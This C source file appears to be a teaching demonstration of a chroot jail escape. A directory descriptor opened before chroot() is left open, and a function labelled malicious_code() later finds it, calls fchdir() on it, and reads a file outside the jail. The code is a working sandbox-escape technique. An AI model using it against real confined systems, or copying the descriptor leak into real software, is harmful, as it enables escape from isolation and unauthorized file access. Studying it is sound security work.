#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>

#include "errormsg.h"

void malicious_code(void);

int main(int argc, char **argv)
{
	char	*chroot_dir = "/var/tmp/chroot",
		*outside_dir = "/var/tmp/",
		*exec_program = argv[1];
	DIR	*DIR_outside_chroot;


	fprintf(stderr, "Current working direc.: %s\n",  get_current_dir_name());

	/* open directory above chroot direc. */
	/* opendir() sets FD_CLOEXEC */
	if( (DIR_outside_chroot = opendir(outside_dir)) == NULL)
		err_mesg(FATAL_SYS, "Can't open dir %s", outside_dir);

	/* chroot */
	if(chroot(chroot_dir) < 0 || chdir("/") < 0)
		err_mesg(FATAL_SYS, "Can't chroot to dir %s", chroot_dir);

	fprintf(stderr, "Current working direc.: %s\n",  get_current_dir_name());

	/* malicious code gets executed */
	/* due to buffer overflow, format bug, malloc bug, etc. */
	malicious_code();

	exit(-1);
}

void malicious_code(void)
{
	char		*file_outside = "../../tmp/FILE",
			buf[1024] = {0};
	int		i, fd, max_fdesc, num_bytes;
	struct stat	stat_buf;


	if((max_fdesc = sysconf(_SC_OPEN_MAX)) < 0)
        	max_fdesc = 1024;

	fprintf(stderr, "BREAK: Current working direc.: %s\n",
			get_current_dir_name());

	for(i = 0; i < max_fdesc; i++)
	{
		fprintf(stderr, "fdesc: %d... ", i);

		if(fstat(i, &stat_buf) < 0)
		{
			//err_mesg(WARN_SYS, "BREAK: Can't fstat");
			putchar('\n');
			continue;
		}

		if(S_ISDIR(stat_buf.st_mode))
		{
			fprintf(stderr, "BREAK: Found file descriptor of directory !\n");
			if(fchdir(i) < 0)
			{
				err_mesg(WARN_SYS, "BREAK: Can't fchdir");
				continue;
			}

			fprintf(stderr, "BREAK: Current working direc.: %s\n",
					get_current_dir_name());

			fprintf(stderr, "BREAK: Try to read file outside chroot:\n");
			if( (fd = open(file_outside, O_RDONLY)) < 0)
				err_mesg(FATAL_SYS, "BREAK: Can't open %s",
								file_outside);

			while( (num_bytes = read(fd, buf, sizeof(buf)-1)) > 0)
			{
				if(buf[num_bytes-1] == '\n')
					buf[num_bytes-1] = 0;
				fprintf(stderr, "BREAK: File: \"%s\"\n", buf);
			}

			close(fd);
			return;
		}

		putchar('\n');
	}

	return;
}
